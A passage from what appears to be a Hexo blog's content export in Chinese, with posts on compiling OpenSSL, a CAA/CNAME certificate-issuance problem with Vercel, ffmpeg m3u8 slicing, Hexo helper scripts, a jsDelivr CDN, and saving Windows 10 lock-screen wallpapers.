test，如果全部显示OK，说明编译正确。</p><p>执行nmake -f ms\ntdll.mak install，所有头文件和lib文件就都被拷贝到前面prefix指定的目录了。</p><p>新版本（1.1.0以后的版本是）</p><p>nmake</p><p>nmake test</p><p>nmake install</p><h2 id="Linux下的编译"><a href="#Linux下的编译" class="headerlink" title="Linux下的编译"></a>Linux下的编译</h2><p>去官网下载源码，具体命令以1.1.1g为例</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.openssl.org/source/openssl-1.1.1g.tar</span><br><span class="line">tar -xzf  openssl-1.1.1g.tar.gz</span><br><span class="line"><span class="built_in">cd</span> openssl-1.1.1g</span><br><span class="line">./config --prefix=/usr/local/openssl</span><br><span class="line">./config -t</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNAME记录指向vercel影响了CAA记录导致的SSL证书无法签发的问题</title>
      <link href="/posts/3655275721/"/>
      <url>/posts/3655275721/</url>
      
        <content type="html"><![CDATA[<h3 id="直接看解决方案"><a href="#直接看解决方案" class="headerlink" title="直接看解决方案"></a>直接看解决方案</h3><p>最狠的：直接把dns中有关vercel全暂停了<br>或者：先暂停二级域名对vecel的解析，即暂停example.com-&gt;vecel<br>然后再暂停受影响的子域的vecel 即暂停 a.example.com-&gt;vecel </p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>今天阿里云告知我有一个域名的SSL证书快过期了，已经是老手的我熟练地打开阿里云控制台申请证书。</p><p>但是发生了一件怪事，以往证书都能在一分钟下发，而这一次等了好久都不行。我决定先睡一觉起来再看看。</p><p>睡醒以后，打开阿里云控制台，发现还是不成功，此时我仍然怀疑是阿里云的锅。于是我用freessl再申请了一次，等到下午还是没成功。用<a href="https://myssl.com/">myssl.com/</a>检测的结果如下：</p><table><thead><tr><th align="left">地区</th><th align="left">是否匹配</th></tr></thead><tbody><tr><td align="left">中国</td><td align="left">不匹配 (验证失败，您的CAA配置不允许当前CA为您签发证书，请修改为：symantec.com或digicert.com)</td></tr><tr><td align="left">香港</td><td align="left">不匹配 (验证失败，您的CAA配置不允许当前CA为您签发证书，请修改为：symantec.com或digicert.com)</td></tr><tr><td align="left">美国</td><td align="left">不匹配 (验证失败，您的CAA配置不允许当前CA为您签发证书，请修改为：symantec.com或digicert.com)</td></tr></tbody></table><p>我没设置过CAA记录啊！</p><p>我心想应该不是DNS缓存的问题吧？不可能啊！</p><p>但是我还是到阿里云控制台把所有的DNS记录都暂停解析。</p><p>结果，居然成功了！成功了！</p><p>后经过排查发现是解析到vercel上的cname记录导致的问题发生，这是为啥呢？vercel还有权限帮我设置CAA记录！？</p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>后经一番搜索终于知道了原因，就是因为CAA记录惹的祸</p><blockquote><p> CAA(Certificate Authority Authorization)，即证书颁发机构授权。是一项新的可以添加到DNS记录中的额外字段,通过DNS机制创建CAA资源记录，可以限定域名颁发的证书和CA（证书颁发机构）之间的联系。未经授权的第三方尝试通过其他CA注册获取用于该域名的SSL/TLS证书将被拒绝。</p><p>域名设置 CAA 记录，使网站所有者，可授权指定CA机构为自己的域名颁发证书，以防止HTTPS证书错误签发，从而提高网站安全性。</p></blockquote><p>补充一个知识点，CNAME记录会影响CAA记录：</p><p>CAA 记录检查继续对指向不同域的 CNAME 记录进行。在此例中，<a href="www.example.com">www.example.com</a> 指向 <a href="www.example.net">www.example.net</a> ，后者也有 CAA 记录：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(Example 7 / www.example.com)</span><br><span class="line">Domain   Record type  Flags  Tag      Value   </span><br><span class="line">www.example.com.   CNAME www.example.net</span><br><span class="line">www.example.net.   CAA           0      issue   ";"</span><br><span class="line"></span><br><span class="line">(Result: CAA failed)</span><br></pre></td></tr></tbody></table></figure><p>第一个记录将 CAA 检查转向 <a href="http://www.example.net.此/">www.example.net。此</a> CAA 记录可阻止任何 CA 颁发证书，证书办法机构无法为 <a href="http://www.example.com/">www.example.com</a> 颁发证书。</p><p>如果所指向的域 (<a href="http://www.example.net/">www.example.net</a>) 没有 CAA 记录，则 CAA 记录检查将上攀到基本域 (example.com)。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(Example 8 / www.example.com)</span><br><span class="line">Domain   Record type  Flags  Tag      Value   </span><br><span class="line">www.example.com.   CNAME www.example.net</span><br><span class="line">example.com.   CAA           0      issue   "amazon.com"</span><br><span class="line"></span><br><span class="line">(Result: CAA passed)</span><br></pre></td></tr></tbody></table></figure><p><strong>用白话说就是因为设置了cname指向vercel，而vercel设置了CAA记录，从而影响了我们的域名的CAA记录</strong>，用工具查询后发现确实如此：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  "canIssue": false,</span><br><span class="line">  "status": "IssueMismatch",</span><br><span class="line">  "domain": "czqu.net",</span><br><span class="line">  "queryAt": "Sep 30, 2021 11:21:55 AM",</span><br><span class="line">  "elapsed": 1,</span><br><span class="line">  "caaRecordSet": [</span><br><span class="line">    {</span><br><span class="line">      "domain": "czqu.net",</span><br><span class="line">      "caaRecords": [</span><br><span class="line">        {</span><br><span class="line">          "issuerCritical": 0,</span><br><span class="line">          "tag": "issue",</span><br><span class="line">          "value": "letsencrypt.org",</span><br><span class="line">          "type": 257,</span><br><span class="line">          "dclass": 1,</span><br><span class="line">          "ttl": 60</span><br><span class="line">        },</span><br><span class="line">        {</span><br><span class="line">          "issuerCritical": 0,</span><br><span class="line">          "tag": "issue",</span><br><span class="line">          "value": "globalsign.com",</span><br><span class="line">          "type": 257,</span><br><span class="line">          "dclass": 1,</span><br><span class="line">          "ttl": 60</span><br><span class="line">        }</span><br><span class="line">      ]</span><br><span class="line">    }</span><br><span class="line">  ]</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>因此阿里云使用的免费DigiCert 证书颁发机构无法给我的域名颁发证书。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> 踩坑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用ffmpeg将MP4转换成m3u8格式的视频切片</title>
      <link href="/posts/823464988/"/>
      <url>/posts/823464988/</url>
      
        <content type="html"><![CDATA[<h4 id="1-获取ffmpeg"><a href="#1-获取ffmpeg" class="headerlink" title="1.获取ffmpeg"></a>1.获取ffmpeg</h4><p><a href="https://ffmpeg.org/download.html">打开这里下载</a></p><h4 id="2-视频切片"><a href="#2-视频切片" class="headerlink" title="2.视频切片"></a>2.视频切片</h4><p>第一步：mp4转成ts格式，一对一转换，转换后大小没什么变化。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -y -i 迪迦奥特曼.mp4 -vcodec copy -acodec copy -vbsf h264_mp4toannexb 迪迦奥特曼.ts</span><br></pre></td></tr></tbody></table></figure><p>第二步，按间隔分片，1对N，下面的5即“每个分片5秒”，可以自己切换。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i 迪迦奥特曼.ts -c copy -map 0 -f segment -segment_list playlist.m3u8 -segment_time 5 迪迦奥特曼%03d.ts</span><br></pre></td></tr></tbody></table></figure><p><strong>关于MP4的参数，务必满足视频编码为H264，音视频编码为AAC（YouTube下载的视频默认即此格式），如果不是请用格式工厂进行转换</strong></p><h4 id="3-完成"><a href="#3-完成" class="headerlink" title="3.完成"></a>3.完成</h4><p>把中间生成的ts文件清理</p><blockquote><p>推荐使用<a href="https://dplayer.js.org/">DPlayer</a>进行视频播放</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ffmpeg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo便捷使用方案</title>
      <link href="/posts/1115750794/"/>
      <url>/posts/1115750794/</url>
      
        <content type="html"><![CDATA[<h4 id="1-快速提交"><a href="#1-快速提交" class="headerlink" title="1.快速提交"></a>1.快速提交</h4><p>将以下内容保存为bat，然后放置在博客目录下</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git add -A </span><br><span class="line">git commit -m<span class="string">"%date:~0,4%%date:~5,2%%date:~8,2%%time:~0,2%%time:~3,2%%time:~6,2%"</span> </span><br><span class="line">git push -u origin master -f</span><br><span class="line">pause</span><br></pre></td></tr></tbody></table></figure><h4 id="2-快速预览"><a href="#2-快速预览" class="headerlink" title="2.快速预览"></a>2.快速预览</h4><p>将以下内容保存为bat，然后放置在博客目录下</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></tbody></table></figure><p>喜欢使用Windows Terminal的:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wt  -p <span class="string">"Windows Powershell"</span> -d . powershell -noExit <span class="string">"hexo s"</span></span><br></pre></td></tr></tbody></table></figure><p>在当前选项卡而不是新窗口打开:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wt --window 0 -p <span class="string">"Windows Powershell"</span> -d . powershell -noExit  <span class="string">"hexo s"</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsDelivr+Github构建自己的免费CDN</title>
      <link href="/posts/2220992601/"/>
      <url>/posts/2220992601/</url>
      
        <content type="html"><![CDATA[<p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科</p><p>放在Github的资源在国内加载速度比较慢，因此需要使用CDN加速来优化网站打开速度，jsDelivr + Github便是免费且好用的CDN，非常适合博客网站使用。</p><h2 id="1、新建Github仓库"><a href="#1、新建Github仓库" class="headerlink" title="1、新建Github仓库"></a>1、新建Github仓库</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2220992601/image-20210928222424972-16328390699281.png" alt="image-20210928222424972"></p><h2 id="2、克隆Github仓库到本地"><a href="#2、克隆Github仓库到本地" class="headerlink" title="2、克隆Github仓库到本地"></a>2、克隆Github仓库到本地</h2><p>点击 Clone or download，一键复制仓库地址</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2220992601/image-20210928222501925-16328391037672.png" alt="image-20210928222501925"></p><p>在本地目录右键 Git Bash Here，执行以下命令：</p><figure class="highlight console"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git  git clone 一键复制的仓库地址</span><br></pre></td></tr></tbody></table></figure><h2 id="3、上传资源"><a href="#3、上传资源" class="headerlink" title="3、上传资源"></a>3、上传资源</h2><p>复制需要上传的资源到本地git仓库（注：jsDelivr不支持加载超过20M的资源），在本地git仓库目录下右键 Git Bash Here，执行以下命令：</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git status                    //查看状态</span><br><span class="line">git add .                     //添加所有文件到暂存区</span><br><span class="line">git commit -m '第一次提交'      //把文件提交到仓库</span><br><span class="line">git push                      //推送至远程仓库</span><br></pre></td></tr></tbody></table></figure><h2 id="4、发布仓库"><a href="#4、发布仓库" class="headerlink" title="4、发布仓库"></a>4、发布仓库</h2><p>点击release发布</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2220992601/image-20210928222544304-16328391457443.png" alt="image-20210928222544304"></p><p>自定义发布版本号</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2220992601/image-20210928222621150-16328391831374.png" alt="image-20210928222621150"></p><h2 id="5、通过jsDelivr引用资源"><a href="#5、通过jsDelivr引用资源" class="headerlink" title="5、通过jsDelivr引用资源"></a>5、通过jsDelivr引用资源</h2><p>使用方法：<a href="https://link.zhihu.com/?target=https://cdn.jsdelivr.net/gh/">https://cdn.jsdelivr.net/gh/</a>你的用户名/你的仓库名@发布的版本号/文件路径</p><p>例如：</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://cdn.jsdelivr.net/gh/czqu/cdn@1.0/images/trhx.png</span><br><span class="line">https://cdn.jsdelivr.net/gh/czqu/cdn@2.0.1/css/style.css  </span><br><span class="line">https://cdn.jsdelivr.net/gh/czqu/cdn@3.1.3/test.mp4</span><br></pre></td></tr></tbody></table></figure><p>注意：版本号不是必需的，是为了区分新旧资源，如果不使用版本号，将会直接引用最新资源，除此之外还可以使用某个范围内的版本，查看所有资源等，具体使用方法如下：</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 加载任何Github发布、提交或分支</span><br><span class="line">https://cdn.jsdelivr.net/gh/user/repo@version/file</span><br><span class="line"></span><br><span class="line">// 加载 jQuery v3.2.1</span><br><span class="line">https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js</span><br><span class="line"></span><br><span class="line">// 使用版本范围而不是特定版本</span><br><span class="line">https://cdn.jsdelivr.net/gh/jquery/jquery@3.2/dist/jquery.min.js   https://cdn.jsdelivr.net/gh/jquery/jquery@3/dist/jquery.min.js</span><br><span class="line"> </span><br><span class="line">// 完全省略该版本以获取最新版本</span><br><span class="line">https://cdn.jsdelivr.net/gh/jquery/jquery/dist/jquery.min.js</span><br><span class="line"> </span><br><span class="line">// 将“.min”添加到任何JS/CSS文件中以获取缩小版本，如果不存在，将为会自动生成</span><br><span class="line">https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/src/core.min.js</span><br><span class="line"> </span><br><span class="line">// 在末尾添加 / 以获取资源目录列表</span><br><span class="line">https://cdn.jsdelivr.net/gh/jquery/jquery/</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>保存Win10锁屏上的壁纸</title>
      <link href="/posts/1037488110/"/>
      <url>/posts/1037488110/</url>
      
        <content type="html"><![CDATA[<blockquote><p> 前言：一些用win10的同学可能都有这种感觉，win10的锁屏界面图片特别漂亮，但可惜的是不知道怎么将它保存下来，错过的可能再也找不回来了，因此本文将给大家介绍两种方法保存win10锁屏界面的图片。 </p></blockquote><h3 id="一、保存近期的锁屏壁纸："><a href="#一、保存近期的锁屏壁纸：" class="headerlink" title="一、保存近期的锁屏壁纸："></a>一、保存近期的锁屏壁纸：</h3><h3 id="1-打开资源管理器，在地址栏输入如下文字后回车"><a href="#1-打开资源管理器，在地址栏输入如下文字后回车" class="headerlink" title="1.打开资源管理器，在地址栏输入如下文字后回车"></a>1.打开资源管理器，在地址栏输入如下文字后回车</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%localappdata%\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-29f0e41377d1f85b442814d2aa2eaaf9_b.png" alt="img"></p><h3 id="2-这时可以看到有很多未知文件，这些就是锁屏界面缓存的图片啦"><a href="#2-这时可以看到有很多未知文件，这些就是锁屏界面缓存的图片啦" class="headerlink" title="2.这时可以看到有很多未知文件，这些就是锁屏界面缓存的图片啦"></a>2.这时可以看到有很多未知文件，这些就是锁屏界面缓存的图片啦</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-9cf2116d251c8578cf99406ad7d3663d_b.png" alt="img"></p><h3 id="3-然后我们把它复制到另一个文件夹，这里我复制到E盘的新建文件夹里"><a href="#3-然后我们把它复制到另一个文件夹，这里我复制到E盘的新建文件夹里" class="headerlink" title="3.然后我们把它复制到另一个文件夹，这里我复制到E盘的新建文件夹里"></a>3.然后我们把它复制到另一个文件夹，这里我复制到E盘的新建文件夹里</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-c7ae640146f4b988c63aa50ff06595d3_b.png" alt="img"></p><h3 id="4-这时候按一下WIN-R键，在运行框输入cmd回车，然后在命令行里用命令定位到你刚才复制的文件夹，如下图"><a href="#4-这时候按一下WIN-R键，在运行框输入cmd回车，然后在命令行里用命令定位到你刚才复制的文件夹，如下图" class="headerlink" title="4.这时候按一下WIN+R键，在运行框输入cmd回车，然后在命令行里用命令定位到你刚才复制的文件夹，如下图"></a>4.这时候按一下WIN+R键，在运行框输入cmd回车，然后在命令行里用命令定位到你刚才复制的文件夹，如下图</h3><p> win键大概长下图这样 ：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-941cb83b6e99c41612f6571822e4faa1_b.png" alt="img"></p><p>win键</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-706ea8ccd76d5380025b6ba3daee1084_b.png" alt="img"></p><p>如果文件夹不在系统盘要注意红框这里，需要先切换到文件夹所在磁盘：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-39f3f26fe7ff6ce7e735215f5b679c23_b.png" alt="img"></p><h3 id="5-在命令行里输入下面的命令后回车-这是一个批量重命名的命令，不懂可以不用深究，其实这里正确的格式应该是jfif-不过用jpg也没关系。"><a href="#5-在命令行里输入下面的命令后回车-这是一个批量重命名的命令，不懂可以不用深究，其实这里正确的格式应该是jfif-不过用jpg也没关系。" class="headerlink" title="5.在命令行里输入下面的命令后回车,这是一个批量重命名的命令，不懂可以不用深究，其实这里正确的格式应该是jfif,不过用jpg也没关系。"></a>5.在命令行里输入下面的命令后回车,这是一个批量重命名的命令，不懂可以不用深究，其实这里正确的格式应该是jfif,不过用jpg也没关系。</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ren *.*  *.jpg</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-a87998b33ff9afd5bfa7cd2e060037e1_b.png" alt="img"></p><h3 id="6-大功告成，在文件夹内右键刷新一下，应该就能正常显示了（打码是为了避免图片侵权），如下图"><a href="#6-大功告成，在文件夹内右键刷新一下，应该就能正常显示了（打码是为了避免图片侵权），如下图" class="headerlink" title="6.大功告成，在文件夹内右键刷新一下，应该就能正常显示了（打码是为了避免图片侵权），如下图"></a>6.大功告成，在文件夹内右键刷新一下，应该就能正常显示了（打码是为了避免图片侵权），如下图</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-c790fea58d3254b8df81d12c6a8e66cc_b.png" alt="img"></p><h3 id="二、保存当前的锁屏壁纸"><a href="#二、保存当前的锁屏壁纸" class="headerlink" title="二、保存当前的锁屏壁纸"></a>二、保存当前的锁屏壁纸</h3><h3 id="1-获取用户SID"><a href="#1-获取用户SID" class="headerlink" title="1.获取用户SID"></a>1.获取用户SID</h3><p>当前锁屏壁纸保存位置和你的用户SID有关系，一般锁屏图片存在如下位置：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Microsoft\Windows\SystemData\&lt;Your-SID&gt;\ReadOnly\LockScreen_A</span><br></pre></td></tr></tbody></table></figure><p><your-sid>需要用命令行获取，有关命令行的使用方法上文已经有提到过</your-sid></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount where name='%username%' get sid</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-c65295d8cbdde5726858f79524294df0_b.png" alt="img"></p><h3 id="2-设置安全属性打开此文件夹"><a href="#2-设置安全属性打开此文件夹" class="headerlink" title="2.设置安全属性打开此文件夹"></a>2.设置安全属性打开此文件夹</h3><p>由于此文件夹不能直接访问，我们需要首先设置安全属性，于是我们需要首先打开</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Microsoft\Windows</span><br></pre></td></tr></tbody></table></figure><p>然后打开 SystemData 文件夹的高级安全属性设置，如下图：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-7f428630d25ad9b8600d29eb1c97811e_b.png" alt="img"></p><p>先点更改然后点高级：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-df9024a314c746d2227b562f03289866_b.png" alt="img"></p><p>点击立即查找，找到和你账户相同名字的用户就双击确认:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-aaee884720f232646269a8a0c027fe8c_b.png" alt="img"></p><p>那么现在文件夹的所有者应该已经变成了你，然后我们给替换字容器和对象的所有者打上勾，然后确定：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-d2890fb1cc8b843f2519710e7cd950cf_b.png" alt="img"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-41ad26a1fb68a7aedbbb576d1192f32f_b.png" alt="img"></p><h3 id="3-获取我们需要的图片"><a href="#3-获取我们需要的图片" class="headerlink" title="3.获取我们需要的图片"></a>3.获取我们需要的图片</h3><p>这时候我们应该可以打开 SystemData 文件夹了，这里面会有多个子文件夹，和上文获取到的&lt;Your-SID&gt;是对应的</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-13a97252d9f0386f1a52a602fba5265a_b.png" alt="img"></p><p>此时我们打开与你账户对应的子文件夹，进入到上文提到的目录即可看到锁屏图片了：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/1037488110/v2-853a98cad146252804bebdcb252c0e4a_b.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo自定义页面方法</title>
      <link href="/posts/2603939427/"/>
      <url>/posts/2603939427/</url>
      
        <content type="html"><![CDATA[<p>网上都是这两种方法，但是会导致网页只有body里面的内容，即hexo处理后有一些标签消失了，这里将介绍<a href="#%E6%88%91%E7%9A%84%E6%96%B9%E6%A1%88">第三种方法</a>解决。</p><h5 id="网上常见的两种方法"><a href="#网上常见的两种方法" class="headerlink" title="网上常见的两种方法"></a>网上常见的两种方法</h5><p>第一种方法是使用Hexo提供的跳过渲染配置，适用于整个目录的设置。具体步骤，打开博客根目录<code>_config.yml</code>，找到其中<code>skip_render</code>项，这个项目用来配置<code>/source/</code>中需要跳过渲染的文件或目录，例如希望跳过<code>/source/test/</code>里的所有文件渲染，可以配置为：</p><figure class="highlight avrasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">skip_render:</span> test<span class="comment">/**</span></span><br></pre></td></tr></tbody></table></figure><p>匹配规则是一种类似正则的规则，官方给出的参考是<a href="https://github.com/isaacs/minimatch">这个</a>。另外在测试这个功能的时候发现，Hexo的内部缓存不是特别好用，有时候你修改了配置但生成出来的内容不一定及时应用了新配置，最好在生成之前执行一下<code>hexo clean</code>命令，清除掉旧的生成文件和缓存。</p><p>第二种方法是给单个文件添加不应用模板的标记，适用于个别特殊文件的处理。例如我们的网站如果要使用百度统计，往往需要在根目录放一个html格式的验证文件，这个文件默认也会经过用主题模板渲染，避免渲染的办法就是在文件头部添加如下内容：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">layout:</span> <span class="literal">false</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></tbody></table></figure><h5 id="我的方案"><a href="#我的方案" class="headerlink" title="我的方案"></a>我的方案</h5><p>可是我实践以后发现hexo还是对网页进行了改动，&lt;body&gt;&lt;html&gt;等标签都不见了,只剩下下面的内容。</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"error-page"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"covers-main w3layouts"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main-cover w3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.html"</span> <span class="attr">class</span>=<span class="string">"logo"</span>&gt;</span>Web Error Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span 